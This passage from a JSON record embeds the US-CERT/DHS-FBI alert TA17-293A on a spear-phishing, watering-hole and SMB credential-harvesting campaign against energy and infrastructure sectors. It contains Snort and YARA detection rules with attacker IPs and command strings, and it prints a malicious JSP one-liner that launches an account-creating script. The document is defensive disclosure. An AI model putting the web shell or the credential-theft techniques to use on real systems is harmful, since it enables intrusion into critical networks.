netbios-ssn;)</code></p><p>________________________________________</p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1; flow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'\"; sid:42000005; rev:1; flow:established,to_server; content:\"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a-z0-9]{3}=[a-z0-9]{32}&amp;/U\"; classtype:bad-unknown; metadata:service http;)</code></p><p><code>__________________________________________</code></p><p><code>alert tcp $EXTERNAL_NET [139,445] -&gt; $HOME_NET any (msg:\"SMB Server Traffic contains NTLM-Authenticated SMBv1 Session\"; sid:42000006; rev:1; flow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; classtype:bad-unknown; metadata:service netbios-ssn;)</code><br /> </p><h5>YARA Rules</h5><p>This is a consolidated rule set for malware associated with, consisting of rules written by US-CERT, as well as contributions by trusted partners.</p><p><code>*/</code></p><p> </p><p><code>rule APT_malware_1</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"inveigh pen testing tools &amp; related artifacts\"</code></p><p><code>      author = \"US-CERT Code Analysis Team\"    </code></p><p><code>      date = \"2017/07/17\"</code></p><p><code>      hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"</code></p><p><code>      hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"</code></p><p><code>      hash2 = \"BA756DD64C1147515BA2298B6A760260\"</code></p><p><code>      hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"</code></p><p><code>      hash4 = \"04738CA02F59A5CD394998A99FCD9613\"</code></p><p><code>      hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"</code></p><p><code>      hash6 = \"65A1A73253F04354886F375B59550B46\"</code></p><p><code>      hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"</code></p><p><code>      hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"</code></p><p><code>      hash9 = \"722154A36F32BA10E98020A8AD758A7A\"</code></p><p><code>      hash10 = \"4595DBE00A538DF127E0079294C87DA0\"</code></p><p><code>strings:</code></p><p><code>      $s0 = \"file://\"</code></p><p><code>      $s1 = \"/ame_icon.png\"</code></p><p><code>      $s2 = \"184.154.150.66\"</code></p><p><code>      $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }</code></p><p><code>      $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }</code></p><p><code>      $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"</code></p><p><code>      $s6 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"</code></p><p><code>      $s8 = \"NlZzSZk=\"</code></p><p><code>      $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"</code></p><p><code>      $s10 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"</code></p><p><code>      $s12 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"</code></p><p><code>      $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }</code></p><p><code>      $s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }</code></p><p><code>      $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }</code></p><p> </p><p> </p><p><code>//inveigh pentesting tools</code></p><p> </p><p><code>      $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }</code></p><p> </p><p><code>//specific malicious word document PK archive</code></p><p> </p><p><code>      $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }</code></p><p><code>      $s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }</code></p><p><code>      $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }</code></p><p><code>      $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s22 = \"5.153.58.45\"</code></p><p><code>      $s23 = \"62.8.193.206\"</code></p><p><code>      $s24 = \"/1/ree_stat/p\"</code></p><p><code>      $s25 = \"/icon.png\"</code></p><p><code>      $s26 = \"/pshare1/icon\"</code></p><p><code>      $s27 = \"/notepad.png\"</code></p><p><code>      $s28 = \"/pic.png\"</code></p><p><code>      $s29 = \"http://bit.ly/2m0x8IH\"</code></p><p><code>     </code></p><p><code>condition:</code></p><p><code>      ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)</code></p><p><code>}</code></p><p> </p><p><code>rule APT_malware_2</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"rule detects malware\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }</code></p><p><code>      $http_push = \"X-mode: push\" nocase</code></p><p><code>      $http_pop = \"X-mode: pop\" nocase</code></p><p><code>condition:</code></p><p><code>      any of them</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC_PT_2</code></p><p><code>{</code></p><p><code>      meta:</code></p><p><code>            name= \"Query_XML_Code_MAL_DOC_PT_2\"</code></p><p><code>            author = \"other\"</code></p><p><code>      strings:</code></p><p><code>            $zip_magic = { 50 4b 03 04 }</code></p><p><code>            $dir1 = \"word/_rels/settings.xml.rels\"</code></p><p><code>            $bytes = {8c 90 cd 4e eb 30 10 85 d7}</code></p><p><code>      condition:</code></p><p><code>            $zip_magic at 0 and $dir1 and $bytes</code></p><p><code>}</code></p><p> </p><p><code>rule Query_Javascript_Decode_Function</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_Javascript_Decode_Function\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}</code></p><p><code>      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}</code></p><p><code>      $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}</code></p><p><code>      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}</code></p><p><code>      $func_call=\"a(\\\"\"</code></p><p><code>condition:</code></p><p><code>      filesize &lt; 20KB and #func_call &gt; 20 and all of ($decode*)</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_XML_Code_MAL_DOC\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $zip_magic = { 50 4b 03 04 }</code></p><p><code>      $dir = \"word/_rels/\" ascii</code></p><p><code>      $dir2 = \"word/theme/theme1.xml\" ascii</code></p><p><code>      $style = \"word/styles.xml\" ascii</code></p><p><code>condition:</code></p><p><code>      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd</code></p><p><code>}</code></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>This APT actor’s campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>DHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.</p><h4>Network and Host-based Signatures</h4><p>DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to their watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network has experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to identify malicious activity.</p><h4>Detections and Prevention Measures</h4><ul><li>Users and administrators can detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the IOC packages to the following locations:<ul><li>network intrusion detection system/network intrusion protection system  logs,</li><li>web content logs,</li><li>proxy server logs,</li><li>domain name server resolution logs,</li><li>packet capture (PCAP) repositories,</li><li>firewall logs,</li><li>workstation Internet browsing history logs,</li><li>host-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,</li><li>data loss prevention logs,</li><li>exchange server logs,</li><li>user mailboxes,</li><li>mail filter logs,</li><li>mail content logs,</li><li>AV mail logs,</li><li>OWA logs,</li><li>Blackberry Enterprise Server logs, and</li><li>Mobile Device Management logs.</li></ul></li><li>To detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following locations:<ul><li>application logs,</li><li>IIS/Apache logs,</li><li>file system,</li><li>intrusion detection system/ intrusion prevention system logs,</li><li>PCAP repositories,</li><li>firewall logs, and</li><li>reverse proxy.</li></ul></li><li>Detect spear-phishing by searching workstation file systems, as well as network-based user directories, for attachment filenames and hashes found in the IOC packages.</li><li>Detect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.</li><li>Detect evasion techniques by the threat actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows system logs.</li><li>Detect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.</li><li>Detect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be reviewed by the account owners.</li><li>Detect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.</li><li>Detect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.</li><li>Detect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.</li><li>Detect persistence on servers by searching system logs for all filenames listed in the IOC packages.</li><li>Detect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires PowerShell version 5, and PowerShell logging must be enabled prior to the activity.)</li><li>Detect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.</li><li>Detect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”. Services\\MaxInstanceCount” and the value of “REG_DWORD 1” at location “HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.</li><li>Detect installation by searching all proxy logs for downloads from URIs without domain names.</li></ul><h4>General Best Practices Applicable to this Campaign:</h4><ul><li>Prevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137. See the NCCIC/US-CERT publication on <a href=\"https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices\">SMB Security Best Practices </a>for more information.</li><li>Block the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.</li><li>Monitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).</li><li>Deploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and downloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on the host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.</li><li>Segment any critical networks or control systems from business systems and networks according to industry best practices.</li><li>Ensure adequate logging and visibility on ingress and egress points.</li><li>Ensure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands an attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for monitoring and analysis. See the FireEye blog post <a href=\"http://Greater Visibility through PowerShell Logging\">Greater Visibility through PowerShell Logging </a>for more information.</li><li>Implement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\">Compromised Web Servers and Web Shells – Threat Awareness and Guidance</a>.</li><li>Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.</li><li>Implement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</li><li>Block RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.</li><li>Store system logs of mission critical systems for at least one year within a security information event management tool.</li><li>Ensure applications are configured to log the proper level of detail for an incident response investigation.</li><li>Consider implementing HIPS or other controls to prevent unauthorized code execution.</li><li>Establish least-privilege controls.</li><li>Reduce the number of Active Directory domain and enterprise administrator accounts.</li><li>Based on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.</li><li>Establish a password policy to require complex passwords for all users.</li><li>Ensure that accounts for network administration do not have external connectivity.</li><li>Ensure that network administrators use non-privileged accounts for email and Internet access.</li><li>Use two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access, privileged access, and access to sensitive data).</li><li>Implement a process for logging and auditing activities conducted by privileged accounts.</li><li>Enable logging and alerting on privilege escalations and role changes.</li><li>Periodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for sensitive data that may have inadvertently been included.</li><li>Assign sufficient personnel to review logs, including records of alerts.</li><li>Complete independent security (as opposed to compliance) risk review.</li><li>Create and participate in information sharing programs.</li><li>Create and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of asset, and an incident response plan.</li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870.</p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"\">[1] FireEye. Factors Motivating Cyber Espionage Against the Energy Sector. September 3, 2015 09:21:00AM, 15-00008886, Version: 2</a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017. </a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017.</a></li>\n\t\t\t\t\t<li><a href=\"\">[4] CCIRC CF17-010 UPDATE</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5] MIFR-10127623</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>October 20, 2017: Initial version</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "10082 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-293A",
					"source_name": "open source",
					"description": "Original release date: October 20, 2017 | Last revised: October 23, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<ul><li>Domain Controllers</li><li>File Servers</li><li>Email Servers</li></ul>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on advanced persistent threat (APT) actions targeting government entities and organizations in the energy, nuclear, water, aviation, and critical manufacturing sectors. Working with U.S. and international partners, DHS and FBI identified victims in these sectors. This report contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by APT actors on compromised victims’ networks.</p><p>DHS assesses this activity as a multi-stage intrusion campaign by threat actors targeting low security and small networks to gain access and move laterally to networks of major, high value asset owners within the energy sector. Based on malware analysis and observed IOCs, DHS has confidence that this campaign is still ongoing, and threat actors are actively pursuing their ultimate objectives over a long-term campaign. The intent of this product is to educate network defenders and enable them to identify and reduce exposure to malicious activity.</p><p>For a downloadable copy of IOC packages and associated files, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A_TLP_WHITE_CSV.csv\">TA17-293A_TLP_WHITE.csv</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20_TLP_%20WHITE.xml\">TA17-293A_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">MIFR-10127623_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE_stix.xml\">MIFR-10127623_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE.pdf\">MIFR-10128327_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE_stix.xml\">MIFR-10128327_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE.pdf\">MIFR-10128336_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE_stix.xml\">MIFR-10128336_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE.pdf\">MIFR-10128830­_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE_stix.xml\">MIFR-10128830­_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE.pdf\">MIFR-10128883_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE_stix.xml\">MIFR-10128883_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE.pdf\">MIFR-10135300_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE_stix.xml\">MIFR-10135300_TLP_WHITE_stix.xml</a></li></ul><p>Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Since at least May 2017, threat actors have targeted government entities and the energy, water, aviation, nuclear, and critical manufacturing sectors, and, in some cases, have leveraged their capabilities to compromise victims’ networks. Historically, cyber threat actors have targeted the energy sector with various results, ranging from cyber espionage to the ability to disrupt energy systems in the event of a hostile conflict. [1] Historically, threat actors have also targeted other critical infrastructure sectors with similar campaigns.</p><p>Analysis by DHS, FBI, and trusted partners has identified distinct indicators and behaviors related to this activity. Of specific note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2]</a></p><p>This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third party suppliers with less secure networks. The initial victims are referred to as “staging targets” throughout this alert. The threat actor uses the staging targets’ networks as pivot points and malware repositories when targeting their final intended victims. The ultimate objective of the cyber threat actors is to compromise organizational networks, which are referred throughout this alert as “intended target.”</p><h4>Technical Details</h4><p>The threat actors in this campaign employed a variety of TTPs, including:</p><ul><li>open-source reconnaissance,</li><li>spear-phishing emails (from compromised legitimate accounts),</li><li>watering-hole domains,</li><li>host-based exploitation,</li><li>industrial control system (ICS) infrastructure targeting, and</li><li>ongoing credential gathering.</li></ul><h4>Using Cyber Kill Chain for Analysis</h4><p>DHS leveraged the Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of activity within this framework.</p><p><strong>Stage 1: Reconnaissance</strong></p><p>The threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. It is known that threat actors are actively accessing publicly available information hosted by organization-monitored networks. DHS further assesses that threat actors are seeking to identify information pertaining to network and organizational design, as well as control system capabilities, within organizations.</p><p>Forensic analysis identified that threat actors are conducting open-source reconnaissance of their targets, gathering information posted on company-controlled websites. This is a common tactic for collecting the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publically accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.</p><p>Analysis also revealed that the threat actors used compromised staging target networks to conduct open-source reconnaissance to identify potential targets of interest and intended targets. “Targets of interest” refers to organizations that DHS observed the threat actors showing an active interest in, but where no compromise was reported. Specifically, the threat actors accessed publically web-based remote access infrastructure such as websites, remote email access portals, and virtual private network (VPN) connections.</p><p><strong>Stage 2: Weaponization</strong></p><h5>Spear-Phishing Email TTPs</h5><p>Throughout the spear-phishing campaign, threat actors used email attachments to leverage legitimate Microsoft Office functions to retrieve a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//&lt;remote IP address&gt;/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server prior to retrieving the requested file. (Note: It is not necessary for the file to be retrieved for the transfer of credentials to occur.) The threat actors then likely used password-cracking techniques to obtain the plaintext password. Once actors obtain valid credentials, they are able to masquerade as authorized users.</p><p><strong>Stage 3: Delivery</strong></p><p>When seeking to compromise the target network, threat actors used a spear-phishing email campaign that differed from previously reported TTPs. The spear-phishing email used a generic contract agreement theme, with the subject line “AGREEMENT &amp; Confidential”, and which contained a generic PDF document, titled “’’document.pdf”. (Note the inclusion of two single apostrophes at the beginning of the attachment name.) The PDF itself was not malicious and did not contain any active code. The document prompted the user to click on a link should a download not automatically begin. (Note: No code within the PDF initiated a download.) The link directs users to a website via a shortened URL, which may prompt them to retrieve a malicious file.</p><p>In previous reporting, DHS and FBI identified the common themes used in these spear-phishing emails, all emails referred to control systems or process control systems. The threat actors continue to use these themes, specifically against intended target organizations. Email messages include references to common industrial control equipment and protocols. The emails leveraged malicious Microsoft Word attachments that appear to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, as well as invitations and policy documents that entice the user to open the attachment. The list of file names has been published in the IOC.</p><p><strong>Stage 4: Exploitation</strong></p><p>Threat actors used distinct and unusual TTPs (i.e., successive redirects) in the phishing campaign directed at staging targets. Emails contained a stacked URL-shortening link that directed the user to http://bit[.]ly/2m0x8IH link, which redirected the user to http://tinyurl[.]com/h3sdqck link, which redirected the user to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained an email address and password input fields mimicking a login page for a website.</p><p>When exploiting the intended targets, threat actors used malicious .docx files to capture user credentials, however, DHS did not observe the actors establishing persistence on the user’s system. The documents attempt to retrieve a file through a “file:\\\\” connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139 and User Datagram Protocol (UDP) ports 137 or 138. This connection is made to a command and control (C2) server — either a server owned by the threat actors or that of a compromised system owned by a staging location victim. When a user is authenticated as a domain user, this will provide the C2 server with the hash of the victim. Local users will receive a graphical user interface (GUI) prompt to enter a username and password. This information will be provided to the C2 over TCP ports 445 or 139 and UDP ports 137 or 138. (Note: A file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[3]</a></p><h5><strong>Use of Watering Hole Domains</strong></h5><p>One of the threat actors’ primary uses for staging targets is to develop watering holes. The threat actors compromise the infrastructure of trusted organizations to reach intended targets. [4] Although these watering holes may host legitimate content by reputable organizations, the threat actors have altered them to contain and reference malicious content. Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure.</p><p>Using a similar SMB collection technique, the actors manipulated these websites by altering JavaScript and PHP files that redirect to an IP address on port 445 for credential harvesting. The compromised sites include both custom developed web applications and template-based frameworks. The threat actors injected a line of code into header.php, a legitimate PHP file that carried out the redirected traffic.</p><p>There is no indication that threat actors used zero-day exploits to manipulate the sites; the threat actors more likely used legitimate credentials to access the website content directly.</p><p><strong>Stage 5: Installation</strong></p><p>The threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication is not used. <a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5]</a> Once inside of an intended target’s network, the threat actors downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.</p><p>In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:</p><ul><li>The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.</li><li>The files were renamed to new extensions, with INST.txt being renamed INST.exe.</li><li>The files were executed on the host and then immediately deleted.</li><li>The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of a compromised system of an intended target.</li></ul><p>In their report on Dragonfly, Symantec associated the MD5 hash of INST.exe to Backdoor.Goodor. The MD5 hashes for the previously mentioned files can be found in the IOC list above.</p><p>Several of these files were scripts that were used for creating the initial account leveraged by the threat actors. The initial script symantec_help.jsp contained a one-line reference to a malicious script. It was located at C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\.</p><p><strong>Contents of symantec_help.jsp</strong></p><p>____________________________________________________________________________________________________________________</p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\&lt;REDACTED SCRIPT NAME&gt;\\\"\"); %&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>The malicious script created a user account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group for elevated privileges. This script contained hard-coded values for the group name “administrator” in Spanish, Italian, German, French, and English.</p><p>In addition, the threat actors also created a scheduled task “reset”, which was designed to automatically log out of their newly created account every eight hours.</p><p><strong>Contents of Scheduled Task</strong></p><p><strong>____________________________________________________________________________________________________________________</strong></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;</p><p>&lt;Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"&gt;</p><p> &lt;RegistrationInfo&gt;</p><p>  &lt;Date&gt;2017-06-25T11:51:17.4848488&lt;/Date&gt;</p><p>  &lt;Author&gt;&lt;REDACTED&gt;&lt;/Author&gt;</p><p> &lt;/RegistrationInfo&gt;</p><p> &lt;Triggers&gt;</p><p>  &lt;TimeTrigger&gt;</p><p>   